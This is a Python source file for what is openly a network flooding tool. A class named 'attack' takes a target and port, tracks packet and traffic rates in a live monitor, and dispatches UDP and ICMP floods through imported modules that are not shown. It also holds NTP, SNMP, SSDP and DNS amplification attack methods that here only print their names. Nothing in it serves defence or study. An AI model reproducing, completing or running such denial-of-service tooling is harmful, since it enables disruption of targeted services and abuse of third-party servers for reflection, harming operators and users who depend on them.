import sys
import time

def Calc(n, d, unit=''):
    SUFFIX = {
        0: '',
        1: 'K',
        2: 'M',
        3: 'G',
        4: 'T'}
    i = 0
    r = float(n)
    while r/d >= 1:
        r = r/d
        i += 1
    return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)

class attack:
    def __init__(self, args):
        self.target = args.target
        self.port = args.port
        self.npackets = 0   # Number of packets sent
        self.nbytes = 0     # Number of bytes reflected

    def Monitor(self):
        ATTACK = (
            '     Sent      '
            '|    Traffic    '
            '|    Packet/s   '
            '|     Bit/s     '
            '\n{}').format('-'*63)
        print(ATTACK)
        FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
        start = time.time()
        while True:
            try:
                current = time.time() - start
                bps = (self.nbytes*8)/current
                pps = self.npackets/current
                out = FMT.format(
                    Calc(self.npackets, 1000),
                    Calc(self.nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
                sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
                time.sleep(1)
            except KeyboardInterrupt:
                print('\nInterrupted')
                break
            except Exception as err:
                print('\nError:', str(err))
                break

    def UDP_Flood(self):
        import UDP_Flood
        UDP_Flood.UDP_Flood(self.target, self.port)

    def ICMP_Flood(self):
        import ICMP_Flood
        ICMP_Flood.ICMP_Flood(self.target)

    def NTP_Amplification(self):
        print('NTP Amplification Attack')

    def SNMP_Amplification(self):
        print('SNMP Amplification Attack')

    def SSDP_Amplification(self):
        print('SSDP Amplification Attack')

    def DNS_Amplification(self):
        print('DNS Amplification Attack')
